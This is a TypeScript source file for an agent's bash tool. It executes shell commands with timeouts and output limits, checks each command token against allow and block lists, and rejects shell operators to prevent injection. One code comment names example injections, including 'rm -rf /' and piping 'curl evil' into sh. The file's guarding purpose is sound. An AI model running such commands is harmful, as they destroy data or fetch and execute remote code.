import { exec } from "node:child_process";
import { promisify } from "node:util";
import { z } from "zod";
import type { Tool } from "../types.js";

const execAsync = promisify(exec);

const bashInputSchema = z.object({
  command: z.string().min(1),
  timeout: z.number().int().positive().max(120_000).optional(),
  maxOutputBytes: z.number().int().positive().max(5_000_000).optional(),
});

interface BashToolOptions {
  allowedCommands?: string[];
  blockedCommands?: string[];
  /** Allow shell metacharacters (dangerous — only enable for trusted contexts like CLI). */
  allowShellOperators?: boolean;
}

/** Shell metacharacters that enable command chaining / injection. */
const SHELL_OPERATORS = /[;|&`$(){}><\n\\]/;

/** Extract all command tokens from a pipeline/chain (split on shell operators). */
const extractCommandTokens = (command: string): string[] => {
  return command
    .split(/[;|&`$(){}><\n]+/)
    .map((segment) => segment.trim().split(/\s+/)[0] ?? "")
    .filter((token) => token.length > 0);
};

export const createBashTool = (opts: BashToolOptions = {}): Tool => ({
  name: "bash",
  description: "Execute a shell command with timeout and output truncation.",
  parameters: bashInputSchema,
  async execute(args) {
    const input = bashInputSchema.parse(args);
    const command = input.command;

    // Block shell operators unless explicitly allowed.
    // This prevents injection via: ls; rm -rf /, ls && curl evil|sh, ls $(whoami), etc.
    if (!opts.allowShellOperators && SHELL_OPERATORS.test(command)) {
      return {
        content:
          "command rejected: shell operators (;|&`$(){}><) are not allowed. " +
          "Use separate tool calls for each command.",
        isError: true,
      };
    }

    // Check every command token against allow/block lists, not just the first one.
    const tokens = extractCommandTokens(command);

    for (const token of tokens) {
      if (opts.allowedCommands && !opts.allowedCommands.includes(token)) {
        return {
          content: `command '${token}' is not allowed`,
          isError: true,
        };
      }

      if (opts.blockedCommands?.includes(token)) {
        return {
          content: `command '${token}' is blocked`,
          isError: true,
        };
      }
    }

    try {
      const result = await execAsync(command, {
        timeout: input.timeout ?? 30_000,
        maxBuffer: input.maxOutputBytes ?? 1_048_576,
      });

      const content = [result.stdout, result.stderr].filter((part) => part.length > 0).join("\n");
      return {
        content: content.trim(),
      };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : "bash execution failed";
      return {
        content: message,
        isError: true,
      };
    }
  },
});
